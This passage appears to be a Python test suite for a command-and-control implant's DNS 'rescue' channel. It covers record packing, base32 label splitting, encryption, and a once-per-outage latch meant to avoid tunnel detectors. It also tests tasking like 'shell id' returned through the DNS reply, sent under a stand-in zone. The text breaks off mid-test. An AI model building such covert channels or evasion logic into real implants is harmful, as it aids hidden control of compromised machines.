#!/usr/bin/env python3
"""Tests for the rescue record a stuck beacon carries out over DNS.

The record format is the one thing the implant, the listener and the
server must agree on byte for byte, and the arithmetic that gets it into
a DNS label has a margin one character wide. So these tests assert the
numbers rather than trusting them: an off-by-one here produces a third
label, which is legal DNS, plausible to read, and only visible as an
over-long name on a live network.

`_encrypt_like_the_beacon` mirrors `beacon._encrypt` — dict, compact
JSON separators, AES-256-GCM, base64 — with a fixed key. It is a mirror
rather than an import because `beacon.py` is served to a target as
source text and pulling it in here would drag the whole implant into a
test about ten bytes. A test in Task 2 pins the two against each other.
"""

import base64
import json
import math
import os
import shutil
import socket
import struct
import subprocess
import sys
import unittest
import unittest.mock
from pathlib import Path
from pathlib import Path as pathlib_Path

sys.path.insert(0, str(Path(__file__).parent.parent.parent))

from software.c2 import dns_rescue
from software.c2.beacon import _aes_gcm_encrypt

_KEY = b"\x11" * 32
_NONCE = b"\x22" * 12


def _encrypt_like_the_beacon(data: dict) -> str:
    """What `beacon._encrypt` does, with the nonce pinned.

    The real one draws a random nonce; a fixed one keeps the length
    arithmetic reproducible, and the length is what these tests are about.
    """
    plaintext = json.dumps(data, separators=(",", ":")).encode()
    ct = _aes_gcm_encrypt(_KEY, _NONCE, plaintext)
    return base64.b64encode(_NONCE + ct).decode()


def _a_record() -> bytes:
    return dns_rescue.pack(
        {"https": (dns_rescue.CLASSES["http_status"], 407),
         "dns": (dns_rescue.CLASSES["answered"], 0),
         "smb": (dns_rescue.CLASSES["refused"], 111),
         "quic": (dns_rescue.CLASSES["timed_out"], 0)},
        dns_rescue.FLAG_PROXY_FOUND | dns_rescue.FLAG_DNS_ANSWERED)


def _a_ciphertext() -> str:
    raw = _a_record()
    return _encrypt_like_the_beacon({dns_rescue.WRAPPER_KEY: base64.b64encode(raw).decode()})


class TestTheRecord(unittest.TestCase):
    def test_the_record_is_nineteen_bytes(self):
        # Five transports at three bytes each, plus version, fingerprint
        # and flags. Two bytes for the code, because 407 does not fit in
        # one.
        self.assertEqual(len(_a_record()), 19)
        self.assertEqual(dns_rescue.RECORD_BYTES, 19)

    def test_gsocket_is_the_fifth_and_last_transport(self):
        self.assertEqual(dns_rescue.TRANSPORTS,
                         ("https", "dns", "smb", "quic", "gsocket"))

    def test_pack_and_unpack_round_trip(self):
        got = dns_rescue.unpack(_a_record())
        self.assertEqual(got["version"], dns_rescue.VERSION)
        self.assertEqual(got["https"],
                         (dns_rescue.CLASSES["http_status"], 407))
        self.assertEqual(got["dns"], (dns_rescue.CLASSES["answered"], 0))
        self.assertEqual(got["smb"], (dns_rescue.CLASSES["refused"], 111))
        self.assertEqual(got["quic"], (dns_rescue.CLASSES["timed_out"], 0))
        self.assertEqual(got["flags"],
                         dns_rescue.FLAG_PROXY_FOUND
                         | dns_rescue.FLAG_DNS_ANSWERED)

    def test_a_transport_nobody_tried_reads_as_not_attempted(self):
        raw = dns_rescue.pack({"https": (dns_rescue.CLASSES["refused"], 0)}, 0)
        got = dns_rescue.unpack(raw)
        self.assertEqual(got["smb"], (dns_rescue.CLASSES["not_attempted"], 0))
        self.assertEqual(dns_rescue.CLASSES["not_attempted"], 0)

    def test_a_wrong_length_or_version_is_refused(self):
        for bad in (b"", b"\x00" * 15, b"\x00" * 17, b"\xff" + b"\x00" * 15):
            with self.subTest(raw=bad):
                with self.assertRaises(ValueError):
                    dns_rescue.unpack(bad)

    def test_a_five_transport_record_round_trips(self):
        packed = dns_rescue.pack(
            {"https": (dns_rescue.CLASSES["timed_out"], 0),
             "gsocket": (dns_rescue.CLASSES["carrier_failed"], 0)},
            dns_rescue.FLAG_DNS_ANSWERED, 0xBEEF)
        self.assertEqual(len(packed), 19)
        out = dns_rescue.unpack(packed)
        self.assertEqual(out["version"], 2)
        self.assertEqual(out["fingerprint"], 0xBEEF)
        self.assertEqual(out["gsocket"],
                         (dns_rescue.CLASSES["carrier_failed"], 0))

    def test_a_v1_record_from_the_field_still_reads(self):
        # What an implant deployed before this change sends: 16 bytes,
        # version 1, four transports.
        v1 = struct.pack("!BHBHBHBHBHB", 1, 0xBEEF,
                         dns_rescue.CLASSES["timed_out"], 0,
                         dns_rescue.CLASSES["answered"], 0,
                         dns_rescue.CLASSES["not_attempted"], 0,
                         dns_rescue.CLASSES["not_attempted"], 0,
                         dns_rescue.FLAG_DNS_ANSWERED)
        out = dns_rescue.unpack(v1)
        self.assertEqual(out["version"], 1)
        self.assertEqual(out["https"], (dns_rescue.CLASSES["timed_out"], 0))
        self.assertEqual(out["gsocket"],
                         (dns_rescue.CLASSES["not_attempted"], 0))

    def test_an_unknown_version_is_still_refused(self):
        with self.assertRaises(ValueError):
            dns_rescue.unpack(b"\x07" + b"\x00" * 18)

    def test_every_http_status_fits(self):
        # The field is two bytes precisely so that 407 -- a proxy demanding
        # authentication, the most useful thing this record can say -- is
        # representable. A one-byte field refused it.
        for status in (401, 403, 407, 502, 599):
            with self.subTest(status=status):
                got = dns_rescue.unpack(dns_rescue.pack(
                    {"https": (dns_rescue.CLASSES["http_status"], status)}, 0))
                self.assertEqual(got["https"][1], status)

    def test_a_code_beyond_two_bytes_is_refused_rather_than_truncated(self):
        # Keeping the low bits would report a failure that never happened.
        with self.assertRaises(ValueError) as cm:
            dns_rescue.pack(
                {"https": (dns_rescue.CLASSES["http_status"], 65536)}, 0)
        self.assertIn("https", str(cm.exception))

    def test_an_unknown_class_is_refused(self):
        with self.assertRaises(ValueError) as cm:
            dns_rescue.pack({"https": (200, 0)}, 0)
        self.assertIn("https", str(cm.exception))

    def test_an_unknown_transport_name_is_refused(self):
        # A typo in a caller would otherwise be silently dropped, and the
        # record would say that leg was never attempted.
        with self.assertRaises(ValueError) as cm:
            dns_rescue.pack({"htps": (dns_rescue.CLASSES["refused"], 0)}, 0)
        self.assertIn("htps", str(cm.exception))

    def test_the_flags_are_distinct_single_bits(self):
        flags = (dns_rescue.FLAG_PROXY_FOUND, dns_rescue.FLAG_DOT1X_SEEN,
                 dns_rescue.FLAG_PORTAL_ANSWERED, dns_rescue.FLAG_DNS_ANSWERED)
        self.assertEqual(len(set(flags)), 4)
        for flag in flags:
            with self.subTest(flag=flag):
                self.assertEqual(flag & (flag - 1), 0)
                self.assertLessEqual(flag, 0xFF)


class TestTheLabelArithmetic(unittest.TestCase):
    """The margin here is one character wide. Assert, never assume."""

    def test_the_payload_is_exactly_two_labels_of_at_most_63(self):
        one, two = dns_rescue.to_labels(_a_ciphertext())
        self.assertEqual(len(one) + len(two), dns_rescue.PAYLOAD_CHARS)
        self.assertEqual(dns_rescue.PAYLOAD_CHARS, 103)
        for label in (one, two):
            with self.subTest(label=label):
                self.assertLessEqual(len(label), 63)
                self.assertRegex(label, r"\A[a-z2-7]+\Z")

    def test_base32_is_taken_from_the_bytes_not_from_the_base64_string(self):
        # The trap: base32 of the base64 *text* is 116 characters and three
        # labels. Plausible, wrong, and invisible until it is on a wire.
        cipher = _a_ciphertext()
        one, two = dns_rescue.to_labels(cipher)
        wrong = base64.b32encode(cipher.encode()).decode().rstrip("=")
        self.assertNotEqual(len(one) + len(two), len(wrong))

    def test_labels_round_trip_back_to_the_base64(self):
        cipher = _a_ciphertext()
        self.assertEqual(dns_rescue.from_labels(*dns_rescue.to_labels(cipher)),
                         cipher)

    def test_the_split_is_a_halving_not_a_constant(self):
        # A hard-coded 42 would produce a third label the moment the record,
        # the key name or the separators change. Halving survives that.
        #
        # The loop stops at 9 extra bytes, not 14: with the five-transport
        # record the full chain already costs 103 of the 126 characters two
        # labels hold, and 12 extra bytes push it to 128 -- which `to_labels`
        # refuses by design. This drives four lengths, two of them odd.
        for extra in range(0, 10, 3):
            cipher = _encrypt_like_the_beacon(
                {dns_rescue.WRAPPER_KEY: base64.b64encode(_a_record() + b"\x00" * extra).decode()})
            one, two = dns_rescue.to_labels(cipher)
            with self.subTest(extra=extra):
                self.assertEqual(one + two,
                                 base64.b32encode(base64.b64decode(cipher))
                                 .decode().lower().rstrip("="))
                self.assertLessEqual(len(one), 63)
                self.assertLessEqual(len(two), 63)
                self.assertEqual(len(one), math.ceil((len(one) + len(two)) / 2))

    def test_a_ciphertext_too_long_for_two_labels_is_refused(self):
        # 126 characters is the ceiling for two labels. Past it, silently
        # emitting three would be a name no listener parses.
        too_big = base64.b64encode(os.urandom(100)).decode()
        with self.assertRaises(ValueError):
            dns_rescue.to_labels(too_big)

    def test_labels_that_are_not_base32_are_refused(self):
        for bad in ("!!!", "abc", ""):
            with self.subTest(label=bad):
                with self.assertRaises(ValueError):
                    dns_rescue.from_labels(bad, bad)

    def test_the_marker_is_one_label_and_not_the_tasking_one(self):
        self.assertEqual(dns_rescue.MARKER, "r")
        self.assertNotEqual(dns_rescue.MARKER, "b")



# ── What the beacon keeps (Task 2) ──


def _a_beacon(**protocols):
    """A beacon with every transport off unless a test turns one on."""
    from software.c2.beacon import Beacon

    config = {"c2": {
        "beacon_interval_seconds": 300,
        "jitter_percent": 0,
        "encryption_key": base64.b64encode(_KEY).decode(),
        "proxy": {"mode": "none"},
        "https": {"enabled": False},
        "dns": {"enabled": False, "domain": "rescue.example",
                "resolver": "127.0.0.1"},
        "smb": {"enabled": False},
        "quic": {"enabled": False},
    }}
    config["c2"].update(protocols)
    return Beacon(config)


class TestTheBeaconKeepsWhatItKnows(unittest.TestCase):
    def test_a_fresh_beacon_has_an_empty_leg_record(self):
        beacon = _a_beacon()
        self.assertEqual(beacon._leg_status, {})
        self.assertEqual(beacon._rescue_flags, 0)

    def test_an_https_status_is_recorded_with_its_code(self):
        beacon = _a_beacon(https={"enabled": True})

        class _Resp:
            status_code = 503

            def json(self):
                return {}

        class _Session:
            trust_env = True
            proxies = {}

            def post(self, *a, **kw):
                return _Resp()

        beacon._proxy_session = _Session()
        self.assertIsNone(beacon._beacon_https())
        self.assertEqual(beacon._leg_status["https"],
                         (dns_rescue.CLASSES["http_status"], 503))

    def test_a_407_is_recorded_as_authentication_required(self):
        # The one status this channel exists to carry. _https_post already
        # logs it specially; now it survives the call.
        beacon = _a_beacon(https={"enabled": True})

        class _Resp:
            status_code = 407

            def json(self):
                return {}

        class _Session:
            trust_env = True
            proxies = {}

            def post(self, *a, **kw):
                return _Resp()

        beacon._proxy_session = _Session()
        # The existing warning is behaviour worth keeping, so assert it
        # rather than letting it print into the suite's output.
        with self.assertLogs("raccoon.c2", level="WARNING") as caught:
            beacon._beacon_https()
        self.assertIn("407", "".join(caught.output))
        self.assertEqual(beacon._leg_status["https"],
                         (dns_rescue.CLASSES["auth_required"], 407))

    def test_a_dns_query_that_answers_with_no_tasking_records_answered(self):
        # The distinction the whole rescue rests on: `None` from
        # _beacon_dns means "the resolver never answered" or "there was
        # nothing to deliver", and only the recorded class tells them apart.
        beacon = _a_beacon(dns={"enabled": True, "domain": "rescue.example",
                                "resolver": "127.0.0.1"})
        with unittest.mock.patch.object(
                sys.modules["software.c2.beacon"], "_dns_query",
                return_value=[]):
            self.assertIsNone(beacon._beacon_dns())
        self.assertEqual(beacon._leg_status["dns"],
                         (dns_rescue.CLASSES["answered"], 0))
        self.assertTrue(beacon._rescue_flags & dns_rescue.FLAG_DNS_ANSWERED)

    def test_a_dns_query_that_never_resolves_records_resolve_failed(self):
        beacon = _a_beacon(dns={"enabled": True, "domain": "rescue.example",
                                "resolver": "127.0.0.1"})
        with unittest.mock.patch.object(
                sys.modules["software.c2.beacon"], "_dns_query",
                side_effect=OSError("no route")):
            self.assertIsNone(beacon._beacon_dns())
        self.assertEqual(beacon._leg_status["dns"],
                         (dns_rescue.CLASSES["resolve_failed"], 0))
        self.assertFalse(beacon._rescue_flags & dns_rescue.FLAG_DNS_ANSWERED)

    def test_the_accumulator_is_cleared_at_the_top_of_each_cycle(self):
        # Without this, a failure from an earlier cycle rides along in a
        # later rescue and an operator reads a stale reason as current.
        beacon = _a_beacon()
        beacon._leg_status["https"] = (dns_rescue.CLASSES["refused"], 0)
        beacon._rescue_flags = dns_rescue.FLAG_PROXY_FOUND
        beacon._start_cycle()
        self.assertEqual(beacon._leg_status, {})
        self.assertEqual(beacon._rescue_flags, 0)

    def test_what_is_recorded_packs_without_complaint(self):
        # The record is the only consumer of these pairs, so the classes and
        # codes the beacon writes must be ones `pack` accepts.
        beacon = _a_beacon()
        beacon._leg_status = {
            "https": (dns_rescue.CLASSES["auth_required"], 407),
            "dns": (dns_rescue.CLASSES["answered"], 0),
        }
        raw = dns_rescue.pack(beacon._leg_status, beacon._rescue_flags)
        self.assertEqual(dns_rescue.unpack(raw)["https"],
                         (dns_rescue.CLASSES["auth_required"], 407))


class TestTheBeaconsCopyOfTheFormat(unittest.TestCase):
    """`beacon.py` is served as source text and cannot import the module.

    So it carries a copy, and a copy that drifts is the failure mode this
    arrangement buys. This is the test that makes the drift loud.
    """

    def test_the_classes_match(self):
        from software.c2 import beacon as beacon_mod

        self.assertEqual(beacon_mod._RESCUE_CLASSES, dns_rescue.CLASSES)

    def test_the_flags_match(self):
        from software.c2 import beacon as beacon_mod

        self.assertEqual(
            (beacon_mod._RESCUE_FLAG_PROXY_FOUND,
             beacon_mod._RESCUE_FLAG_DOT1X_SEEN,
             beacon_mod._RESCUE_FLAG_PORTAL_ANSWERED,
             beacon_mod._RESCUE_FLAG_DNS_ANSWERED),
            (dns_rescue.FLAG_PROXY_FOUND, dns_rescue.FLAG_DOT1X_SEEN,
             dns_rescue.FLAG_PORTAL_ANSWERED, dns_rescue.FLAG_DNS_ANSWERED))

    def test_the_struct_and_marker_match(self):
        from software.c2 import beacon as beacon_mod

        self.assertEqual(beacon_mod._RESCUE_STRUCT.format,
                         dns_rescue._STRUCT.format)
        self.assertEqual(beacon_mod._RESCUE_MARKER, dns_rescue.MARKER)
        from software.c2.listeners import dns as dns_listener
        self.assertEqual(dns_listener._RESCUE_MARKER, dns_rescue.MARKER)
        self.assertEqual(beacon_mod._RESCUE_VERSION, dns_rescue.VERSION)
        self.assertEqual(beacon_mod._RESCUE_TRANSPORTS, dns_rescue.TRANSPORTS)
        self.assertEqual(beacon_mod._RESCUE_MAX_PAYLOAD_CHARS,
                         dns_rescue._MAX_PAYLOAD_CHARS)

    def test_both_sides_refuse_a_payload_too_long_for_two_labels(self):
        from software.c2 import beacon as beacon_mod

        too_big = base64.b64encode(os.urandom(100)).decode()
        with self.assertRaises(ValueError):
            beacon_mod._rescue_to_labels(too_big)
        with self.assertRaises(ValueError):
            dns_rescue.to_labels(too_big)

    def test_both_sides_split_an_odd_length_the_same_way(self):
        # A floor-versus-ceil drift would pass a length-90 comparison and
        # fail on the wire, so drive an odd one.
        from software.c2 import beacon as beacon_mod

        found = None
        for extra in range(0, 12):
            candidate = _encrypt_like_the_beacon(
                {dns_rescue.WRAPPER_KEY: base64.b64encode(_a_record() + b"\x00" * extra).decode()})
            length = len(base64.b32encode(base64.b64decode(candidate))
                         .decode().rstrip("="))
            if length % 2:
                found = candidate
                break
        self.assertIsNotNone(found, "no odd-length payload in range")
        self.assertEqual(beacon_mod._rescue_to_labels(found),
                         dns_rescue.to_labels(found))

# ── The trigger and the query (Task 3) ──


class _Sent:
    """Records every TXT query the beacon makes, and answers with nothing."""

    def __init__(self, answer=None):
        self.names = []
        # The local address each query left by, which is empty for every
        # beacon here: the way out's radio rung is the only thing that
        # binds one, and `test_way_out_rungs.py` drives that.
        self.sources = []
        self._answer = answer

    def __call__(self, name, qtype, server, timeout=10, status=None,
                 source=""):
        if status is not None:
            status["rcode"] = 0
        self.names.append(name)
        self.sources.append(source)
        return [self._answer] if self._answer else []


def _rescue_beacon(zone="rescue.example"):
    return _a_beacon(dns={"enabled": True, "domain": zone,
                          "resolver": "127.0.0.1"})


class TestTheTrigger(unittest.TestCase):
    def _exhausted(self, beacon):
        """What the loop's `tasking is None` arm sees after a dead cycle."""
        beacon._start_cycle()
        beacon._record_leg("https", dns_rescue.CLASSES["auth_required"], 407)
        beacon._rescue_flags |= dns_rescue.FLAG_DNS_ANSWERED
        beacon._record_leg("dns", dns_rescue.CLASSES["answered"])
        beacon._record_leg("smb", dns_rescue.CLASSES["unreachable"])
        beacon._record_leg("quic", dns_rescue.CLASSES["timed_out"])

    def test_a_rescue_goes_out_when_nothing_delivered_and_dns_answered(self):
        beacon = _rescue_beacon()
        self._exhausted(beacon)
        sent = _Sent()
        with unittest.mock.patch.object(
                sys.modules["software.c2.beacon"], "_dns_query", sent):
            beacon._maybe_rescue()
        self.assertEqual(len(sent.names), 1)
        labels = sent.names[0].split(".")
        # <p1>.<p2>.<base32(id)>.r.<zone>
        self.assertEqual(labels[3], dns_rescue.MARKER)
        self.assertEqual(".".join(labels[4:]), "rescue.example")
        for label in labels[:3]:
            self.assertRegex(label, r"\A[a-z2-7]+\Z")
            self.assertLessEqual(len(label), 63)
        self.assertEqual(len(labels[0]) + len(labels[1]),
                         dns_rescue.PAYLOAD_CHARS)
        self.assertLessEqual(len(sent.names[0]), 253)

    def test_the_payload_decrypts_back_to_what_the_legs_recorded(self):
        beacon = _rescue_beacon()
        self._exhausted(beacon)
        sent = _Sent()
        with unittest.mock.patch.object(
                sys.modules["software.c2.beacon"], "_dns_query", sent):
            beacon._maybe_rescue()
        one, two = sent.names[0].split(".")[:2]
        wrapper = beacon._decrypt(dns_rescue.from_labels(one, two))
        got = dns_rescue.unpack(
            base64.b64decode(wrapper[dns_rescue.WRAPPER_KEY]))
        self.assertEqual(got["https"],
                         (dns_rescue.CLASSES["auth_required"], 407))
        self.assertEqual(got["dns"], (dns_rescue.CLASSES["answered"], 0))
        self.assertTrue(got["flags"] & dns_rescue.FLAG_DNS_ANSWERED)

    def test_no_rescue_when_the_resolver_did_not_answer(self):
        # The case the next project exists for: nothing can leave, so
        # sending would be noise with no recipient.
        beacon = _rescue_beacon()
        beacon._start_cycle()
        beacon._record_leg("dns", dns_rescue.CLASSES["resolve_failed"])
        beacon._record_leg("https", dns_rescue.CLASSES["unreachable"])
        sent = _Sent()
        with unittest.mock.patch.object(
                sys.modules["software.c2.beacon"], "_dns_query", sent):
            beacon._maybe_rescue()
        self.assertEqual(sent.names, [])

    def test_no_rescue_when_dns_is_not_configured(self):
        beacon = _a_beacon()
        self._exhausted(beacon)
        sent = _Sent()
        with unittest.mock.patch.object(
                sys.modules["software.c2.beacon"], "_dns_query", sent):
            beacon._maybe_rescue()
        self.assertEqual(sent.names, [])

    def test_only_one_rescue_per_exhaustion(self):
        # Rate is the one thing a tunnel detector reliably finds, and a
        # latch has no rate.
        beacon = _rescue_beacon()
        sent = _Sent()
        with unittest.mock.patch.object(
                sys.modules["software.c2.beacon"], "_dns_query", sent):
            for _ in range(20):
                self._exhausted(beacon)
                beacon._maybe_rescue()
        self.assertEqual(len(sent.names), 1)

    def test_the_latch_clears_when_a_leg_recovers(self):
        beacon = _rescue_beacon()
        sent = _Sent()
        with unittest.mock.patch.object(
                sys.modules["software.c2.beacon"], "_dns_query", sent):
            self._exhausted(beacon)
            beacon._maybe_rescue()
            beacon._leg_recovered()
            self._exhausted(beacon)
            beacon._maybe_rescue()
        self.assertEqual(len(sent.names), 2)

    def test_a_name_over_253_characters_is_not_sent(self):
        # Not truncated: a truncated record decrypts to nothing and would
        # be indistinguishable, at the server, from an attacker's noise.
        beacon = _rescue_beacon(zone=("z" * 60 + ".") * 3 + "example")
        self._exhausted(beacon)
        sent = _Sent()
        with unittest.mock.patch.object(
                sys.modules["software.c2.beacon"], "_dns_query", sent):
            beacon._maybe_rescue()
        self.assertEqual(sent.names, [])

    def test_an_exception_carrying_a_hostname_does_not_reach_the_record(self):
        # The real risk, and what the first version of this test missed: a
        # library message with a host or a URL in it, classified into the
        # record. The class is an int derived from the exception's type, so
        # the text must be unreachable -- proven by driving it, not by
        # inspecting the record of hand-written ints.
        import urllib.error

        from software.c2 import beacon as beacon_mod

        secret_host = "secret-dc01.corp.example"
        beacon = _a_beacon(https={"enabled": True}, dns={
            "enabled": True, "domain": "rescue.example",
            "resolver": "127.0.0.1"})

        class _Session:
            trust_env = True
            proxies = {}

            def post(self, *a, **kw):
                raise urllib.error.URLError(
                    OSError("cannot reach %s:8443 via http://user:pw@%s"
                            % (secret_host, secret_host)))

        beacon._proxy_session = _Session()
        beacon._beacon_https()
        with unittest.mock.patch.object(
                sys.modules["software.c2.beacon"], "_dns_query",
                lambda *a, **kw: (kw.get("status", {}).update({"rcode": 0})
                                  or [])):
            beacon._beacon_dns()

        raw = beacon_mod._rescue_pack(beacon._leg_status, beacon._rescue_flags)
        self.assertEqual(len(raw), dns_rescue.RECORD_BYTES)
        for fragment in (secret_host.encode(), b"user:pw", b"8443",
                         b"corp", b"http"):
            with self.subTest(fragment=fragment):
                self.assertNotIn(fragment, raw)

    def test_the_record_carries_no_hostname_or_credential(self):
        beacon = _rescue_beacon()
        self._exhausted(beacon)
        sent = _Sent()
        with unittest.mock.patch.object(
                sys.modules["software.c2.beacon"], "_dns_query", sent):
            beacon._maybe_rescue()
        one, two = sent.names[0].split(".")[:2]
        raw = base64.b64decode(
            beacon._decrypt(dns_rescue.from_labels(one, two))[dns_rescue.WRAPPER_KEY])
        self.assertEqual(len(raw), dns_rescue.RECORD_BYTES)
        for secret in (b"rescue.example", b"127.0.0.1", _KEY,
                       beacon._implant_id.encode()):
            with self.subTest(secret=secret[:12]):
                self.assertNotIn(secret, raw)

    def test_an_answer_to_the_rescue_is_returned_as_tasking(self):
        # One query, not two: the rescue reports and collects the next
        # instruction in the same exchange.
        beacon = _rescue_beacon()
        self._exhausted(beacon)
        task = beacon._encrypt({"cmd": "shell id"})
        with unittest.mock.patch.object(
                sys.modules["software.c2.beacon"], "_dns_query",
                _Sent(answer=task)):
            got = beacon._maybe_rescue()
        self.assertEqual(got, {"cmd": "shell id"})


class TestTheCopyBehavesLikeTheModule(unittest.TestCase):
    """Constants matching is necessary and not sufficient.

    The guarantee that matters is that both sides produce the same bytes
    and the same labels, so this drives the two codecs against each other.
    """

    def test_both_sides_pack_the_same_bytes(self):
        from software.c2 import beacon as beacon_mod

        legs = {"https": (dns_rescue.CLASSES["auth_required"], 407),
                "dns": (dns_rescue.CLASSES["answered"], 0),
                "quic": (dns_rescue.CLASSES["timed_out"], 65535)}
        flags = dns_rescue.FLAG_PROXY_FOUND | dns_rescue.FLAG_DNS_ANSWERED
        self.assertEqual(beacon_mod._rescue_pack(legs, flags),
                         dns_rescue.pack(legs, flags))

    def test_both_sides_split_into_the_same_labels(self):
        from software.c2 import beacon as beacon_mod

        cipher = _a_ciphertext()
        self.assertEqual(beacon_mod._rescue_to_labels(cipher),
                         dns_rescue.to_labels(cipher))

    def test_the_beacon_clamps_where_the_module_raises(self):
        # Deliberate asymmetry: the implant must never crash on the path
        # that explains why it is stuck; the server validates what arrives.
        from software.c2 import beacon as beacon_mod

        over = {"https": (dns_rescue.CLASSES["http_status"], 70000)}
        self.assertEqual(len(beacon_mod._rescue_pack(over, 0)),
                         dns_rescue.RECORD_BYTES)
        with self.assertRaises(ValueError):
            dns_rescue.pack(over, 0)


class TestTheLoopIsWired(unittest.TestCase):
    """The methods above are only a feature if the loop calls them."""

    def _run_cycles(self, beacon, cycles, dns_answers=None,
                    rescue_answer=None):
        """Drive the real `_beacon_loop` for a fixed number of cycles."""
        state = {"n": 0}

        def stop_after(*a, **kw):
            state["n"] += 1
            if state["n"] >= cycles:
                beacon._running = False

        sent = _Sent()

        def query(name, qtype, server, timeout=10, status=None,
                  source=""):
            if status is not None:
                status["rcode"] = 0
            if "." + dns_rescue.MARKER + "." in name:
                sent(name, qtype, server, timeout)
                return [rescue_answer] if rescue_answer else []
            # The ordinary tasking query: the resolver answers, with
            # nothing queued.
            return list(dns_answers or [])

        beacon._running = True
        with unittest.mock.patch.object(beacon, "_jittered_sleep", stop_after), \
             unittest.mock.patch.object(beacon, "_backoff_sleep", stop_after), \
             unittest.mock.patch.object(
                 sys.modules["software.c2.beacon"], "_dns_query", query):
            beacon._beacon_loop()
        return sent.names

    def test_one_dead_cycle_sends_one_rescue(self):
        beacon = _rescue_beacon()
        names = self._run_cycles(beacon, 1)
        self.assertEqual(len(names), 1)
        self.assertIn("." + dns_rescue.MARKER + ".", names[0])

    def test_twenty_dead_cycles_still_send_one(self):
        # The latch, through the real loop rather than by calling
        # _maybe_rescue directly.
        beacon = _rescue_beacon()
        names = self._run_cycles(beacon, 20)
        self.assertEqual(len(names), 1)

    def test_the_loop_actually_runs_what_the_rescue_brought_back(self):
        # The rescue collecting tasking is worth nothing if the loop then
        # drops it, which is exactly what assigning inside the
        # `tasking is None` arm does: the `elif` that dispatches never runs.
        beacon = _rescue_beacon()
        ran = []
        with unittest.mock.patch.object(
                beacon, "_process_tasking_batch", ran.append):
            self._run_cycles(beacon, 1,
                             rescue_answer=beacon._encrypt({"cmd": "shell id"}))
        self.assertEqual(ran, [{"cmd": "shell id"}])

    def test_a_stale_dns_answer_does_not_send_a_rescue_next_cycle(self):
        # Review Focus 5, third attempt. The first could not fail, the
        # second was invalidated when "stuck" stopped meaning "nothing came
        # back". It isolates the accumulator like this: cycle 1 has an
        # UPSTREAM leg delivering, so no rescue is due and the DNS probe
        # never runs; cycle 2 loses that leg and the resolver starts
        # failing. The only thing that could permit a rescue in cycle 2 is
        # a flag left over from an earlier cycle, so a no-op `_start_cycle`
        # sends one into a dead resolver and a correct one sends none.
        beacon = _a_beacon(
            https={"enabled": True},
            dns={"enabled": True, "domain": "rescue.example",
                 "resolver": "127.0.0.1"})
        cycle = {"n": 0}
        sent = []

        def https():
            # Delivers in cycle 1, gone from cycle 2 on.
            return {"cmd": "noop"} if cycle["n"] == 0 else None

        def query(name, qtype, server, timeout=10, status=None,
                  source=""):
            if "." + dns_rescue.MARKER + "." in name:
                sent.append(name)
                return []
            if status is not None:
                status["rcode"] = 2            # SERVFAIL whenever asked
            return []

        def stop_after(*a, **kw):
            cycle["n"] += 1
            if cycle["n"] >= 2:
                beacon._running = False

        # Pre-set the flag the way a cycle with a live resolver would, so
        # the only question this test asks is whether it survives.
        beacon._rescue_flags = dns_rescue.FLAG_DNS_ANSWERED
        beacon._registered = True
        beacon._running = True
        with unittest.mock.patch.object(beacon, "_beacon_https", https), \
             unittest.mock.patch.object(beacon, "_jittered_sleep",
                                        stop_after), \
             unittest.mock.patch.object(beacon, "_backoff_sleep",
                                        stop_after), \
             unittest.mock.patch.object(beacon, "_process_tasking_batch",
                                        lambda *_: None), \
             unittest.mock.patch.object(
                 sys.modules["software.c2.beacon"], "_dns_query", query):
            beacon._beacon_loop()

        self.assertEqual(sent, [],
                         "a rescue went into a resolver that said SERVFAIL, "
                         "which can only happen if a previous cycle's "
                         "FLAG_DNS_ANSWERED survived")


class TestTheLatchSurvivesItsOwnReply(unittest.TestCase):
    """The failure a fresh reviewer found and the direct tests missed.

    `_maybe_rescue`'s answer reached the arm that calls `_leg_recovered`,
    so an answered rescue re-armed the latch, the next dead cycle sent
    another, and with the design's own "queue one attempt per rescue" that
    is one query per cycle -- the periodic behaviour the whole latch
    exists to prevent.
    """

    def _cycles(self, beacon, cycles, rescue_answer=None):
        state = {"n": 0}

        def stop_after(*a, **kw):
            state["n"] += 1
            if state["n"] >= cycles:
                beacon._running = False

        sent = []

        def query(name, qtype, server, timeout=10, status=None,
                  source=""):
            if status is not None:
                status["rcode"] = 0
            if "." + dns_rescue.MARKER + "." in name:
                sent.append(name)
                return [rescue_answer] if rescue_answer else []
            return []

        beacon._running = True
        with unittest.mock.patch.object(beacon, "_jittered_sleep", stop_after), \
             unittest.mock.patch.object(beacon, "_backoff_sleep", stop_after), \
             unittest.mock.patch.object(beacon, "_process_tasking_batch",
                                        lambda *_: None), \
             unittest.mock.patch.object(
                 sys.modules["software.c2.beacon"], "_dns_query", query):
            beacon._beacon_loop()
        return sent

    def test_six_dead_cycles_with_every_rescue_answered_send_one(self):
        beacon = _rescue_beacon()
        sent = self._cycles(beacon, 6,
                            rescue_answer=beacon._encrypt({"cmd": "shell id"}))
        self.assertEqual(len(sent), 1)

    def test_six_dead_cycles_with_the_first_rescue_answered_send_one(self):
        beacon = _rescue_beacon()
        answered = {"n": 0}
        original = beacon._encrypt({"cmd": "shell id"})

        def one_answer(*a, **kw):
            answered["n"] += 1
            return original if answered["n"] == 1 else None

        state = {"n": 0}

        def stop_after(*a, **kw):
            state["n"] += 1
            if state["n"] >= 6:
                beacon._running = False

        sent = []

        def query(name, qtype, server, timeout=10, status=None,
                  source=""):
            if status is not None:
                status["rcode"] = 0
            if "." + dns_rescue.MARKER + "." in name:
                sent.append(name)
                answer = one_answer()
                return [answer] if answer else []
            return []

        beacon._running = True
        with unittest.mock.patch.object(beacon, "_jittered_sleep", stop_after), \
             unittest.mock.patch.object(beacon, "_backoff_sleep", stop_after), \
             unittest.mock.patch.object(beacon, "_process_tasking_batch",
                                        lambda *_: None), \
             unittest.mock.patch.object(
                 sys.modules["software.c2.beacon"], "_dns_query", query):
            beacon._beacon_loop()
        self.assertEqual(len(sent), 1)

    def test_a_real_leg_delivering_still_re_arms_the_latch(self):
        # The latch must not become permanent: a beacon that recovers and
        # then gets stuck again has a new story to tell.
        beacon = _rescue_beacon()
        self.assertFalse(beacon._rescue_sent)
        beacon._rescue_sent = True
        beacon._leg_recovered()
        self.assertFalse(beacon._rescue_sent)


class TestTheResolverMustReallyHaveAnswered(unittest.TestCase):
    """SERVFAIL is not an answer, and a rescue sent into one is noise."""

    def test_a_servfail_is_not_recorded_as_answered(self):
        beacon = _rescue_beacon()

        def query(name, qtype, server, timeout=10, status=None,
                  source=""):
            if status is not None:
                status["rcode"] = 2        # SERVFAIL
            return []

        with unittest.mock.patch.object(
                sys.modules["software.c2.beacon"], "_dns_query", query):
            self.assertIsNone(beacon._beacon_dns())
        self.assertEqual(beacon._leg_status["dns"],
